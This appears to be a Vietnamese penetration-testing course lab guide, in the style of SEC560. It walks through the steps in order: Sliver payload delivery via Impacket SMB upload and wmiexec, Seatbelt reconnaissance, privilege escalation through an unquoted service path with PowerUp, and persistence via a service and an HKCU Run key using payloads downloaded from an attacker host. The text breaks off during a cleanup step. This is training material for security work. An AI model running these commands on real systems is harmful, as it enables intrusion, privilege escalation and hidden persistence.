Lưu ý rằng quyền `rwx` (Đọc, Ghi, Thực thi) chỉ áp dụng cho chủ sở hữu của tệp root. Hãy thay đổi quyền truy cập của tệp để chúng ta có thể tương tác với tệp như một người dùng thông thường.

```bash
sudo chown sec560:sec560 *.dll
ls -l *.dll
```

![alt text](IMG/LAB2/LAB2.5/image-30.png)

Giờ bạn sẽ thấy chủ sở hữu của tập tin là `sec560`.

Chúng ta sẽ sử dụng hai công cụ từ khung `Impacket`. Chúng ta sẽ thảo luận chi tiết hơn về các công cụ này trong mục 560.4, nhưng trước tiên chúng ta cần sử dụng chúng.

Đầu tiên, chúng ta sẽ sao chép tập tin `smbclient.py` lên máy chủ. Chúng ta sẽ sử dụng lệnh `c$` chia sẻ và sau đó tải lên (`put`) tập tin.

> Chú ý mở máy DC Hiboxy 10.130.10.10 lên trước khi sử dụng các câu lệnh bên dưới.

```bash
smbclient.py hiboxy/bgreen:Password1@10.130.10.25
use c$
put OUTRAGEOUS_OTT.dll
ls
exit
```

> LƯU Ý: Thay thế PAYLOAD_NAME bằng tên tệp do Sliver tạo ra.

![alt text](IMG/LAB2/LAB2.5/image-31.png)

```bash
sec560@slingshot:~$ smbclient.py hiboxy/bgreen:Password1@10.130.10.25
Impacket v0.10.1.dev1+20220907.172745.1fe2bbb3 - Copyright 2022 SecureAuth Corporation

Type help for list of commands
# use c$
# put OUTRAGEOUS_OTT.dll
# ls
drw-rw-rw-          0  Wed Mar 20 00:00:17 2024 $Recycle.Bin
drw-rw-rw-          0  Fri Oct 28 22:19:29 2022 $WinREAgent
-rw-rw-rw-          0  Sat Apr  3 07:10:12 2021 $WINRE_BACKUP_PARTITION.MARKER
drw-rw-rw-          0  Fri Oct 28 22:45:18 2022 Boot
-rw-rw-rw-     413738  Fri Oct 28 22:45:18 2022 bootmgr
-rw-rw-rw-          1  Fri Oct 28 22:45:18 2022 BOOTNXT
-rw-rw-rw-       8192  Fri Oct 28 22:45:19 2022 BOOTSECT.BAK
drw-rw-rw-          0  Mon Feb 14 01:36:38 2022 CourseFiles
drw-rw-rw-          0  Fri Dec 16 13:37:08 2016 Documents and Settings
-rw-rw-rw-       8192  Wed Apr  1 13:02:59 2026 DumpStack.log.tmp
drw-rw-rw-          0  Mon Feb 14 04:51:11 2022 EFSTMPWP
drw-rw-rw-          0  Sat Oct 29 06:57:23 2022 inetpub
-rw-rw-rw-   10946048  Wed Apr  1 14:26:18 2026 OUTRAGEOUS_OTT.dll
-rw-rw-rw- 1744830464  Wed Apr  1 13:02:59 2026 pagefile.sys
drw-rw-rw-          0  Sat Oct 29 06:57:22 2022 PerfLogs
drw-rw-rw-          0  Sat Oct 29 06:57:23 2022 Program Files
drw-rw-rw-          0  Sat Oct 29 06:57:23 2022 Program Files (x86)
drw-rw-rw-          0  Tue Mar 19 23:36:59 2024 ProgramData
drw-rw-rw-          0  Fri Jan  7 03:38:42 2022 Python27
drw-rw-rw-          0  Fri Oct 28 22:57:55 2022 Recovery
-rw-rw-rw-   16777216  Wed Apr  1 13:02:59 2026 swapfile.sys
drw-rw-rw-          0  Mon Apr  1 00:34:37 2019 System Volume Information
drw-rw-rw-          0  Sat Jun 22 22:52:17 2019 Temp
drw-rw-rw-          0  Wed Feb  8 04:26:51 2023 Tools
drw-rw-rw-          0  Tue Mar 19 23:59:51 2024 Users
drw-rw-rw-          0  Wed Mar 20 00:17:41 2024 Windows
```

Bạn sẽ thấy tệp DLL của mình ở thư mục gốc của ổ đĩa trên máy chủ từ xa.

Hãy sử dụng một công cụ Impacket khác để thực thi payload `wmiexec.py`.

```bash
wmiexec.py hiboxy/bgreen:Password1@10.130.10.25
  regsvr32 OUTRAGEOUS_OTT.dll
```

![alt text](IMG/LAB2/LAB2.5/image-32.png)

Bạn sẽ thấy phiên làm việc được gửi từ máy chủ đến Sliver.

![alt text](IMG/LAB2/LAB2.5/image-33.png)

ID phiên ở đây là `3e468f91`, nhưng ID của bạn sẽ khác. Bạn chỉ cần sử dụng ký tự đầu tiên miễn là nó duy nhất trong tất cả các phiên của bạn. Chúng tôi sẽ sử dụng hai ký tự đầu tiên để giảm khả năng trùng lặp ký tự đầu tiên.

```bash
use 3e
```

![alt text](IMG/LAB2/LAB2.5/image-34.png)

Hãy chạy info để lấy thông tin về `sesssion`. Thông tin của bạn sẽ khác với thông tin hiển thị ở đây.

![alt text](IMG/LAB2/LAB2.5/image-35.png)

Để dọn dẹp, hãy thoát khỏi phiên làm việc và sử dụng Sliver.

```bash
exit
```

Trong ví dụ này, chúng ta đã sử dụng tệp `DLL`. Chúng ta cũng hoàn toàn có thể tạo tệp `EXE` và thực thi trực tiếp thay vì sử dụng `regsvrDLL`.

## Phần kết luận

Chúng tôi đã tạo ra một số payload khác nhau bằng Metasploit và Sliver. Như đã nói, Metasploit và MSFVenom cung cấp nhiều tùy chọn payload. Các framework C2 khác, chẳng hạn như Sliver, có bộ tùy chọn hạn chế hơn và yêu cầu người dùng tự tạo payload, thường là bằng shellcode từ framework C2.

# Lab 2.6. Seatbelt

## Tổng quan

Chúng ta sẽ sử dụng Seatbelt để hiểu rõ hơn về cấu hình hệ thống Windows 10 của mình.

Chúng tôi sẽ sử dụng máy ảo Windows 10.

## Thiết lập phòng thí nghiệm

Máy ảo được sử dụng:

- Windows 10.

Bạn có thể ping địa chỉ 10.130.10.10 từ máy ảo Windows 10:

```bash
ping 10.130.10.10
```

![alt text](IMG/LAB2/LAB2.6/image.png)

## Hướng dẫn thực hành từng bước

### 1. Khởi động Seatbelt.

Theo trang web của dự án:

> Seatbelt là một dự án C# thực hiện một số "kiểm tra an toàn" khảo sát máy chủ hướng đến bảo mật, có liên quan đến cả khía cạnh tấn công và phòng thủ.

Mở cửa sổ dòng lệnh CMD, sau đó di chuyển đến thư mục `C:\Tool` tương sứng. Lưu ý, nếu bạn sử dụng PowerShell thay vì CMD, cú pháp của các lệnh sẽ thay đổi, vì vậy vui lòng sử dụng CMD.

```bash
cd \Tools
Seatbelt.exe
```

Khi chạy Seatbelt, nó sẽ hiển thị hình ảnh dây an toàn bằng ký tự ASCII trên màn hình và cung cấp kết quả. Để tiết kiệm không gian màn hình (và vì nó sẽ không hiển thị tốt ở đây), chúng ta sẽ tắt hình ảnh bằng lệnh `-q` (quiet).

![alt text](IMG/LAB2/LAB2.6/image-1.png)

### 2. Kiểm tra đơn lẻ

Chúng ta có thể chạy các kiểm tra riêng lẻ bằng cách sử dụng tên của lệnh cụ thể. Hãy chạy lệnh Seatbelt để lấy thông tin về phần mềm diệt virus hiện tại của chúng ta.

```bash
Seatbelt.exe -q AntiVirus
```

![alt text](IMG/LAB2/LAB2.6/image-2.png)

Hãy cùng xem những gì đã được cài đặt trên hệ thống của chúng ta. Trong một bài kiểm thử xâm nhập thực tế, phần mềm trên một hệ thống có thể tương tự như trên các hệ thống khác. Chúng ta có thể sử dụng các lỗ hổng trong phần mềm đó để chuyển hướng tấn công giữa các hệ thống.

```bash
Seatbelt.exe -q InstalledProducts
```

![alt text](IMG/LAB2/LAB2.6/image-3.png)

Bạn còn nhớ Icecast từ bài thực hành 2.2 chứ?

Một số chức năng trong Seatbelt thực hiện các thao tác rất giống với các lệnh tích hợp sẵn. Lợi ích là chúng ta có thể tải tập tin .NET (exe) này vào bộ nhớ trên hệ thống mục tiêu và truy vấn các thông tin như Netstat, nhưng không cần sử dụng `cmd`, `PowerShell` hoặc các tệp thực thi `netstat`, vốn có thể bị giám sát quyền truy cập.

Chúng ta hãy cùng xem xét một hàm như vậy, `TcpConnections`.

```bash
Seatbelt.exe -q TcpConnections
```

![alt text](IMG/LAB2/LAB2.6/image-4.png)

### 3. Groups

Thay vì chạy từng lệnh riêng lẻ, chúng ta có thể chạy các nhóm lệnh. Các nhóm lệnh hiện được Seatbelt hỗ trợ bao gồm:

- `All` - tất cả các lệnh.

- `User` - người dùng hiện tại hoặc tất cả người dùng nếu đang đăng nhập với quyền quản trị.

- `System` - khai thác dữ liệu thú vị về hệ thống mục tiêu.

- `Slack` - các mô-đun được thiết kế để trích xuất thông tin về Slack (đã cài đặt chưa, số lượt tải xuống và không gian làm việc).

- `Chrome` -  trích xuất thông tin liên quan đến trình duyệt Chrome (đã cài đặt chưa, dấu trang, lịch sử).

- `Remote` - các thao tác kiểm tra hoạt động trên hệ thống từ xa (rất hữu ích trước và trong quá trình di chuyển ngang)

- `Misc` - các khoản kiểm tra linh tinh.

Hãy cùng xem xét hệ thống của chúng ta và phân tích kết quả của nhóm Hệ thống.

```bash
Seatbelt.exe -q -group=system
```

![alt text](IMG/LAB2/LAB2.6/image-5.png)

Nhóm này thực thi gần 50 lệnh khác nhau, bao gồm:

```bash
AMSIProviders
AntiVirus
AppLocker
ARPTable
AuditPolicies
AuditSettings
AutoRuns
CredGuard
DNSCache
DotNet
EnvironmentPath
EnvironmentVariables
InterestingProcesses
InternetSettings
LAPS
LastShutdown
LocalGPOs
LocalGroups
LocalUsers
LogonSessions
LSASettings
NamedPipes
NetworkProfiles
NetworkShares
NTLMSettings
OSInfo
PoweredOnEvents
PowerShell
Processes
PSSessionSettings
RDPSessions
SCCM
Services
Sysmon
TcpConnections
TokenPrivileges
UAC
UdpConnections
UserRightAssignments
WindowsAutoLogon
WindowsDefender
WindowsEventForwarding
WindowsFirewall
WMIEventConsumer
WMIEventFilter
WMIFilterBinding
WSUS
```

Đây là một cách nhanh chóng để thu thập nhiều dữ liệu về hệ thống mục tiêu để phân tích ngoại tuyến. Chúng ta hãy cùng xem xét nhanh một vài lệnh thú vị và cách chúng có thể hữu ích.

- `AutoRuns` - Có thể các tệp thực thi hoặc cấu hình của chúng có thể được sửa đổi để duy trì hoạt động hoặc leo thang đặc quyền.

- `InterestingProcesses` - Hữu ích để hiểu các công cụ phòng thủ và quản trị được cài đặt trên hệ thống.

- `LocalGroups and LocalUsers` - Chúng có thể được sử dụng để leo thang quyền hạn hoặc duy trì quyền truy cập.

- `LogonSessions` - Đây là danh sách những người dùng hiện đang đăng nhập. Chúng ta có thể sử dụng quyền truy cập của họ để di chuyển ngang hoặc leo thang đặc quyền.

- `NetworkShares` - Hệ thống của chúng ta có đang chia sẻ thông tin hữu ích mà người khác có thể muốn/cần không? Chúng ta có thể thêm hoặc thay thế các tập tin để truy cập vào người dùng hoặc máy tính khác không?

- `PowerShell` - Lệnh này cho phép chúng ta biết liệu các công nghệ phòng vệ cho PowerShell có được bật hay không. Nếu chúng không được bật, chúng ta có thể sử dụng các công cụ PowerShell. Nếu các biện pháp phòng vệ được bật, thì tốt nhất nên tránh sử dụng PowerShell để không gây ra cảnh báo.

### 4. Remote Usage

Giờ thì mọi thứ trở nên thú vị hơn nhiều! Chúng ta có thể sử dụng công cụ này để tìm hiểu về mục tiêu trước khi cố gắng khai thác nó hoặc di chuyển ngang sang mục tiêu. Windows sẽ tự động truyền mã thông báo người dùng hiện tại của chúng ta, hoặc chúng ta có thể chỉ định tên người dùng và mật khẩu bằng cách sử dụng `-username` và `-password`.

Hãy nhớ rằng chúng ta đã tìm thấy một số thông tin đăng nhập trong bài thực hành 2.1. Chúng ta sẽ sử dụng `bgreen/Password1` để truy vấn một hệ thống khác nhằm lấy thông tin về hệ thống đó.

Hãy nhớ rằng các lệnh có thể chạy từ xa đều có tiền tố là `+`. Chúng ta hãy xem xét các lệnh mà chúng ta có thể chạy từ xa để lấy thông tin từ các máy chủ khác.

```bash
Seatbelt.exe -q | findstr +
```

```bash
C:\Tools>Seatbelt.exe -q | findstr +
Available commands (+ means remote usage is supported):
    + AMSIProviders          - Providers registered for AMSI
    + AntiVirus              - Registered antivirus (via WMI)
    + AuditPolicyRegistry    - Audit settings via the registry
    + AutoRuns               - Auto run executables/scripts/programs
    + DNSCache               - DNS cache entries (via WMI)
    + DotNet                 - DotNet versions
    + ExplorerRunCommands    - Recent Explorer "run" commands
    + Hotfixes               - Installed hotfixes (via WMI)
    + InterestingProcesses   - "Interesting" processes - defensive products and admin tools
    + LAPS                   - LAPS settings, if installed
    + LastShutdown           - Returns the DateTime of the last system shutdown (via the registry).
    + LocalGroups            - Non-empty local groups, "-full" displays all groups (argument == computername to enumerate)
    + LocalUsers             - Local users, whether they're active/disabled, and pwd last set (argument == computername to enumerate)
    + LogonSessions          - Windows logon sessions
    + LSASettings            - LSA settings (including auth packages)
    + MappedDrives           - Users' mapped drives (via WMI)
    + NetworkProfiles        - Windows network profiles
    + NetworkShares          - Network shares exposed by the machine (via WMI)
    + NTLMSettings           - NTLM authentication settings
    + PowerShell             - PowerShell versions and security settings
    + ProcessOwners          - Running non-session 0 process list with owners. For remote use.
    + PSSessionSettings      - Enumerates PS Session Settings from the registry
    + PuttyHostKeys          - Saved Putty SSH host keys
    + PuttySessions          - Saved Putty configuration (interesting fields) and SSH host keys
    + RDPSavedConnections    - Saved RDP connections stored in the registry
    + RDPSessions            - Current incoming RDP sessions (argument == computername to enumerate)
    + SCCM                   - System Center Configuration Manager (SCCM) settings, if applicable
    + ScheduledTasks         - Scheduled tasks (via WMI) that aren't authored by 'Microsoft', "-full" dumps all Scheduled tasks
    + Sysmon                 - Sysmon configuration from the registry
    + UAC                    - UAC system policies via the registry
    + WindowsAutoLogon       - Registry autologon information
    + WindowsDefender        - Windows Defender settings (including exclusion locations)
    + WindowsEventForwarding - Windows Event Forwarding (WEF) settings via the registry
    + WindowsFirewall        - Non-standard firewall rules, "-full" dumps all (arguments == allow/deny/tcp/udp/in/out/domain/private/public)
    + WSUS                   - Windows Server Update Services (WSUS) settings, if applicable
```

Hãy chạy mô-đun UAC này trên hệ thống `10.130.10.25`.

```bash
# Seatbelt.exe -q UAC -computername=10.130.10.25 -username=hiboxy\bgreen -password=Password1

Seatbelt.exe -q UAC -computername=10.130.10.25
```

Chúng ta có thể thấy rằng UAC đang được bật, và chúng ta cần tài khoản `Administrator built-in (RID 500)` để thực hiện `lateral movement`.

Nếu bạn còn thời gian, hãy chạy một số module khác đối với hệ thống từ xa này.


![alt text](IMG/LAB2/LAB2.6/image-6.png)

## Kết luận

Seatbelt rất hữu ích để thực hiện kiểm tra trên cả hệ thống cục bộ và hệ thống từ xa. Các bước kiểm tra được thiết kế để tìm ra những vấn đề có ích nhất cho người kiểm thử xâm nhập.

# Lab 3.1. Windows Privilege Escalation

## Mục tiêu

- Chúng ta sẽ sử dụng beRoot.exe và PowerUp để tìm các vấn đề leo thang đặc quyền cục bộ.

- Chúng tôi sẽ lợi dụng lỗ hổng cấu hình dịch vụ Windows để leo thang đặc quyền cục bộ.

## Thiết lập phòng thí nghiệm

Máy ảo được sử dụng:

- Windows 10.

Bạn chỉ cần khởi động máy ảo Windows cho bài thực hành này.

Trong trường hợp bạn đã từng thực hiện thí nghiệm này trước đây, hãy cùng nhau dọn dẹp nhanh một chút.

Mở cửa sổ lệnh CMD với quyền quản trị bằng cách nhấp vào liên kết trên màn hình máy tính của bạn có tên `Command Prompt - Run as Administrator`, sau đó nhập lệnh sau:

```bash
net localgroup administrators john /del
net user john /del
del "C:\Program Files\VideoStream\1337.exe"
```

## Hướng dẫn thực hành từng bước

### 1. Đăng nhập vào Windows

Đăng xuất khỏi Windows. Nhấp vào menu Bắt đầu, nhấp vào biểu tượng đầu và vai ở phía trên cùng bên trái, sau đó nhấp vào "Đăng xuất".

Đăng nhập vào máy tính Windows bằng thông tin đăng nhập bên dưới:

- Tên người dùng: `.\notadmin`.

- Mật khẩu: `notadmin`.

Đây là tài khoản người dùng thông thường không có quyền quản trị. Chúng tôi không sử dụng tài khoản `sec560` này vì tài khoản hiện tại đã có quyền quản trị cục bộ.

### 2. Chạy beRoot.exe

Công cụ đầu tiên chúng ta sẽ sử dụng để kiểm tra các vấn đề leo thang đặc quyền là `beRoot.exe`. Để chạy `beRoot.exe`, vui lòng mở cửa sổ dòng lệnh thông thường và chạy các lệnh sau, và đừng lo lắng nếu cuối kết quả có một số lỗi:

```bash
cd C:\Tools\BeRoot
beRoot.exe
```

![alt text](IMG/LAB3/LAB3.1/image.png)

### 3. Xem xét kết quả của beRoot

beRoot.exe cung cấp phản hồi ngay lập tức và sẽ hiển thị cho bạn một số vấn đề có thể dẫn đến leo thang đặc quyền. Nó sẽ xác định vấn đề đường dẫn dịch vụ không được trích dẫn với một dịch vụ có tên là `Video Stream`.

Đường dẫn của dịch vụ là `C:\Program Files\VideoStream\1337 Log\checklog.exe`, nhưng đường dẫn nhị phân của dịch vụ lại không có dấu ngoặc kép! Có rất nhiều thông tin đầu ra. Hãy cuộn lên đầu trang để tìm thông tin được hiển thị bên dưới.

![alt text](IMG/LAB3/LAB3.1/image-1.png)

Việc thiếu dấu ngoặc kép trong biến môi trường PATH là tin tốt cho kẻ tấn công!

### 4. Chạy PowerUp.ps1

Bây giờ chúng ta hãy thử kịch bản PowerShell `PowerUp.ps1`. PowerUp hiện là một phần của PowerShell Empire và là một trong những cơ chế chính được sử dụng để thực hiện leo thang đặc quyền cục bộ. Đây là một kịch bản PowerShell thuần túy và do đó có cơ hội chạy trên máy mục tiêu cao hơn so với beRoot.exe. Trong trường hợp sau, có khả năng tệp thực thi beRoot.exe của bạn bị chặn do kiểm soát ứng dụng, chẳng hạn.

Để khởi chạy `PowerUp.ps1`, hãy mở cửa sổ PowerShell và chạy các lệnh sau. Khi được nhắc, nhấn Enter R để chạy tập lệnh (Run once).

```bash
cd C:\Tools
Import-Module .\PowerUp.ps1
R
```

![alt text](IMG/LAB3/LAB3.1/image-2.png)

Bây giờ, chúng ta hãy tiến hành kiểm tra.

```bash
Invoke-AllChecks
```

![alt text](IMG/LAB3/LAB3.1/image-3.png)

Lệnh này sẽ mất vài giây, vì PowerUp.ps1 sẽ thực hiện tất cả các bước kiểm tra nâng cao quyền.

PowerUp sẽ tìm thấy một số thứ mà beRoot không tìm thấy. Hãy cẩn thận với những kết quả sai lệch khi chỉ sử dụng một công cụ!

### 5. Xem xét kết quả của PowerUp

PowerUp có thể sẽ trả về một vài kết quả thú vị:

- Đường dẫn dịch vụ không được trích dẫn cho dịch vụ `Video Stream` (như được xác định bởi BeRoot.exe)

- Một số lỗ hổng có thể dẫn đến tấn công chiếm quyền điều khiển DLL trong thư mục `%PATH%`.

- Một số lỗ hổng liên quan đến các tệp thực thi dịch vụ và quyền truy cập.

![alt text](IMG/LAB3/LAB3.1/image-5.png)

Kết quả của cả beRoot.exe và PowerUp đều cần được kiểm tra thủ công, vì đôi khi chúng hiểu sai các quyền lồng nhau, chẳng hạn. Hãy thử khai thác các vấn đề đã được báo cáo!

### 6. Xem lại dịch vụ 'Video Stream' trong mục dịch vụ.

Trong cửa sổ dòng lệnh beRoot, hãy mở cửa sổ services.msc:

```bash
services.msc
```

Trong danh sách dịch vụ, cuộn xuống Video Streamdịch vụ đó và nhấp đúp vào. Bạn sẽ thấy thông tin chi tiết liên quan đến dịch vụ Video Stream và lưu ý rằng đường dẫn đến tệp thực thi không có dấu ngoặc kép.

Hãy tận dụng điều đó!

![alt text](IMG/LAB3/LAB3.1/image-4.png)

### 7. Khai thác lỗ hổng bằng PowerUp

PowerUp cung cấp một cách tiện lợi để khai thác các lỗ hổng đã được xác định. Nếu bạn xem xét các mục được PowerUp báo cáo, bạn sẽ nhận thấy rằng nó bao gồm một thẻ `AbuseFunction`, cung cấp cú pháp sao chép-dán dễ dàng để thử khai thác các vấn đề đã được xác định.

Để thử cách này với dịch vụ Video Stream dễ bị tổn thương, chúng ta cần cuộn lên một chút đến vài kết quả được báo cáo đầu tiên và sao chép thông `AbuseFunctiontin` được báo cáo: `Write-ServiceBinary -ServiceName 'Video Stream' -Path <HijackPath>`.

Vui lòng sao chép và dán chuỗi này vào cửa sổ dòng lệnh PowerShell. Vui lòng chưa nhấn ENTER!

### 8. Điều chỉnh "HijackPath"

Chúng ta đang lạm dụng vấn đề đường dẫn dịch vụ không được trích dẫn đã được giải thích trong khóa học. Vì tệp thực thi dịch vụ thực tế nằm trong thư mục `C:\Program Files\VideoStream\1337 Log\` và không có khoảng trắng xung quanh đường dẫn đầy đủ, Windows cũng sẽ cố gắng thực thi `C:\Program.exe` hoặc `C:\Program Files\VideoStream\1337.exe`.

Bây giờ chúng ta hãy điều chỉnh "HijackPath" và trỏ nó đến một tệp thực thi có thể ghi được:

```bash
Write-ServiceBinary -ServiceName 'Video Stream' -Path 'C:\Program Files\VideoStream\1337.exe'
```

![alt text](IMG/LAB3/LAB3.1/image-6.png)

Lệnh PowerUp ở trên sẽ ghi một tệp thực thi độc hại vào vị trí được chỉ định! Sau khi chạy lệnh AbuseFunction, bạn sẽ thấy tệp thực thi do PowerShell ghi sẽ tạo ra một người dùng có tên là `john` với mật khẩu là `Password123!`. Sau đó, người dùng này sẽ được thêm vào nhóm quản trị viên cục bộ.

### 9. Khởi động lại máy tính

Sau khi chức năng chống lạm dụng PowerShell chạy xong, hãy kiểm tra xem tệp `C:\Program Files\VideoStream\1337.exe` có tồn tại hay không. Nếu có, chúng ta cần khởi động lại dịch vụ để tệp thực thi được chạy với quyền `NT AUTHORITY\SYSTEM`.

Vì đây là dịch vụ tự khởi động, giải pháp khá đơn giản: khởi động lại hệ thống!

### 10. Đăng nhập vào Windows

Đăng nhập vào máy tính Windows của chúng tôi bằng thông tin đăng nhập người dùng của chúng tôi:

- Tên người dùng: `notadmin`.

- Mật khẩu: `notadmin`.

### 11. Xác nhận người dùng đã được thêm

Hãy xác nhận xem người dùng `john` đã được tạo và thêm vào nhóm quản trị viên cục bộ chưa. Để xác minh điều này, hãy chạy các lệnh sau trong cửa sổ dòng lệnh:

```bash
net users
```

![alt text](IMG/LAB3/LAB3.1/image-7.png)

```bash
net localgroup Administrators
```

![alt text](IMG/LAB3/LAB3.1/image-8.png)

Chúc mừng! Chúng ta vừa nâng cấp từ người dùng không có quyền quản trị lên người dùng có quyền quản trị cục bộ!

Nếu muốn, bạn có thể đăng xuất khỏi tài khoản hiện tại rồi đăng nhập bằng tài khoản mới `john`, tài khoản này hiện là thành viên của nhóm Quản trị viên cục bộ.

![alt text](IMG/LAB3/LAB3.1/image-9.png)

Khi hoàn thành, hãy đăng xuất khỏi tài khoản người dùng `notadmin` (hoặc `john`) và đăng nhập lại vào tài khoản người dùng `sec560` để chuẩn bị cho bài thực hành tiếp theo. Mật khẩu mặc định cho tài khoản `sec560` là sec560, trừ khi bạn đã thay đổi nó.

## Phần kết luận

Chúng tôi đã xác định cách phát hiện và khai thác các lỗ hổng leo thang đặc quyền cục bộ bằng cách sử dụng beRoot và PowerUp. Sử dụng các công cụ này, chúng tôi đã có thể leo thang đặc quyền và tạo một người dùng mới trên hệ thống với quyền quản trị.

# Lab 3.3. Persistence (Duy trì truy cập)

## Mục tiêu

- Tạo nhiều loại tệp để lưu trữ lâu dài với Sliver

- Tạo một dịch vụ lưu trữ dữ liệu để tạo phiên Sliver.

- Tạo khóa đăng ký người dùng để lưu trữ dữ liệu.

- Sử dụng bộ lọc WMI để phát hiện các lần đăng nhập không thành công nhằm kích hoạt tính năng lưu trạng thái.

## Thiết lập phòng thí nghiệm

Máy ảo được sử dụng:

- Máy ảo Linux Slingshot.

- Windows 10.

## Hướng dẫn thực hành từng bước

### 1. Thiết lập Sliver để nhận kết nối

Trước tiên, chúng ta cần thiết lập Sliver để nhận kết nối. Khởi chạy Sliver.

```bash
sudo sliver-server
```

Thiết lập trình lắng nghe trên cổng `443` bằng cách chạy lệnh `https` để khởi động trình lắng nghe.

```bash
https
```

![alt text](IMG/LAB3/LAB3.3/image.png)

### 2. Tạo các gói tin Sliver để duy trì hoạt động.

Hãy cùng xem xét các tùy chọn với `generate`.

```bash
generate -h
```

![alt text](IMG/LAB3/LAB3.3/image-1.png)

Lưu ý rằng chúng ta có thể tạo một định dạng `service`. Định dạng này sẽ phản hồi chính xác với bộ điều khiển dịch vụ và sẽ không bị lỗi sau 30 giây. Vấn đề này được thảo luận chi tiết hơn trong mục `560.4`.

Chúng ta hãy tạo hai payload, một cho dịch vụ và một cho tệp thực thi tiêu chuẩn.

```bash
generate --os windows --arch 64bit --skip-symbols --format service --name service --http https://10.130.10.128
generate --os windows --arch 64bit --skip-symbols --format exe --name payload --http https://10.130.10.128
```

![alt text](IMG/LAB3/LAB3.3/image-2.png)

Trong một bài kiểm thử xâm nhập thực tế, chúng ta có thể muốn hạn chế quyền truy cập và ngăn chặn việc thực thi payload sau khi thời gian kiểm thử cho phép kết thúc. Chúng ta có thể sử dụng `-w` hoặc `--limit-datetime`.

Giờ chúng ta đã có các tập tin, chúng ta cần chuẩn bị chuyển chúng sang Windows.

### 3. Chuyển tập tin sang Windows

**Hãy mở một cửa sổ dòng lệnh mới cho bước này.**

Các tệp hiện thuộc sở hữu của rootngười dùng này. Hãy xác nhận điều này bằng cách xem nội dung các tệp.

```bash
ls -l *.exe
```

Như bạn thấy ở trên, các tệp có quyền `rwx` truy cập, nhưng chỉ dành cho chủ sở hữu của tệp đó `root`.

Thay đổi quyền sở hữu tệp thực thi (exe) cho người dùng `sec560` và sau đó xác nhận quyền sở hữu các tệp.

```bash
sudo chown sec560:sec560 *.exe
ls -l *.exe
```

![alt text](IMG/LAB3/LAB3.3/image-3.png)

Bây giờ chúng ta cần chạy một máy chủ web để có thể lấy các tập tin trong Windows. Hãy chạy máy chủ web Python.

![alt text](IMG/LAB3/LAB3.3/image-4.png)

Tiếp theo, chúng ta sẽ chuyển sang Windows và tải xuống các tập tin bằng PowerShell. Mở cửa sổ PowerShell và tải các tập tin chứa thông tin cần thiết xuống màn hình Desktop.

```bash
cd Desktop
wget http://10.130.10.128:8000/payload.exe -OutFile payload.exe
wget http://10.130.10.128:8000/service.exe -OutFile service.exe
```

![alt text](IMG/LAB3/LAB3.3/image-5.png)

Giờ chúng ta đã có các tập tin trên Windows, hãy tạo khả năng lưu trữ dữ liệu đầu tiên bằng cách sử dụng một dịch vụ.

### 4. Service Persistence

Trước tiên, chúng ta sẽ tạo một dịch vụ theo cách thủ công. Lệnh chúng ta sử dụng được giải thích chi tiết hơn trong mục 560.4. Để làm điều này, chúng ta cần quyền quản trị viên trong Windows. Mở liên `Command Prompt - Run as Administratorkết` trên màn hình Desktop của máy ảo Windows 10 như hình bên dưới.

![alt text](IMG/LAB3/LAB3.3/image-6.png)

Chúng ta sẽ thảo luận chi tiết về lệnh sc này trong mục 560.4. Hiện tại, chúng ta chỉ cần sử dụng lệnh như hiện trạng và tạo một dịch vụ có tên là `persist`. Chạy lệnh dưới đây trong cửa sổ nhắc lệnh CMD mà bạn vừa mở.

```bash
sc create persist binpath= "c:\Users\sec560\Desktop\service.exe" start= auto
```

![alt text](IMG/LAB3/LAB3.3/image-7.png)

Hãy kiểm tra cơ chế duy trì kết nối. Khởi động lại các máy chủ Windows và bạn sẽ thấy một phiên Sliver mới trên máy ảo Linux Slingshot của mình.

![alt text](IMG/LAB3/LAB3.3/image-8.png)

Tương tác với phiên này bằng cách sử dụng hai ký tự đầu tiên của ID phiên `sessions -i`. Trong ví dụ này, đó là `a1e6a0b5` nên chúng ta sử dụng ID rút gọn là 5c. ID phiên của bạn sẽ khác!

![alt text](IMG/LAB3/LAB3.3/image-10.png)

Hãy xem chúng ta có quyền truy cập ở mức độ nào với `whoami`.

```bash
whoami
```

![alt text](IMG/LAB3/LAB3.3/image-11.png)

Như bạn thấy, dịch vụ chạy với quyền SYSTEM, cho phép chúng ta có quyền truy cập cao nhờ cơ chế duy trì quyền này.

Hãy dọn dẹp hệ thống Windows bằng cách tắt và xóa dịch vụ đó.

Mở cửa sổ CMD với quyền quản trị viên trên Windows và tắt tiến trình và dịch vụ bằng các lệnh sau:

```bash
sc stop persist
sc delete persist
```

![alt text](IMG/LAB3/LAB3.3/image-12.png)

### 5. Tính năng duy trì hoạt động của HKCU

Trên máy tính chạy hệ điều hành Windows, hãy mở cửa sổ lệnh CMD thông thường.

![alt text](IMG/LAB3/LAB3.3/image-13.png)

Chạy lệnh `reg` dưới đây để tạo khóa đăng ký cho người dùng hiện tại.

```bash
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "User Persist" /t REG_SZ /F /D "C:\Users\sec560\Desktop\payload.exe"
```

![alt text](IMG/LAB3/LAB3.3/image-14.png)

Các tùy chọn cho lệnh này là:

- `reg` - lệnh cần chạy.

- `add` - thêm khóa.

- `"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"`- Vị trí để thêm khóa

- `/V "User Persist"` - Tên của khóa (Giá trị)

- `/t REG_SZ` - kiểu Chuỗi

- `/F` - Buộc ghi đè nếu tệp đã tồn tại

- `/D "C:\Users\sec560\Desktop\payload.exe"` - dữ liệu, tập tin thực thi để chạy.

Chúng ta có thể sử dụng `HKLM (HKEY Local Machine)` thay thế, và điều này sẽ hoạt động cho bất kỳ người dùng nào đăng nhập vào hệ thống, nhưng nó yêu cầu quyền truy cập nâng cao để sử dụng khóa này. Chúng ta đang sử dụng `HKCU (HKEY Current User)` nên nó không yêu cầu quyền truy cập nâng cao.

Để kiểm tra điều này, chỉ cần đăng xuất khỏi Windows rồi đăng nhập lại với tư cách người dùng `sec560`. Khi đăng nhập lại, bạn sẽ thấy một phiên làm việc mới trong Sliver.

![alt text](IMG/LAB3/LAB3.3/image-15.png)

Tương tác với phiên này bằng cách sử dụng hai ký tự đầu tiên của ID phiên `sessions -i`. Trong ví dụ này, đó là `d725fb0a` nên chúng ta sử dụng ID rút gọn là `d7`. ID phiên của bạn sẽ khác!

```bash
sessions -i d7
```

![alt text](IMG/LAB3/LAB3.3/image-16.png)

Chạy lệnh `whoami` để xem quyền truy cập hiện tại.

```bash
whoami
```

![alt text](IMG/LAB3/LAB3.3/image-17.png)

Hãy dọn dẹp và xóa khóa này. Mở lại cửa sổ lệnh CMD thông thường và xóa khóa đó.

```bash
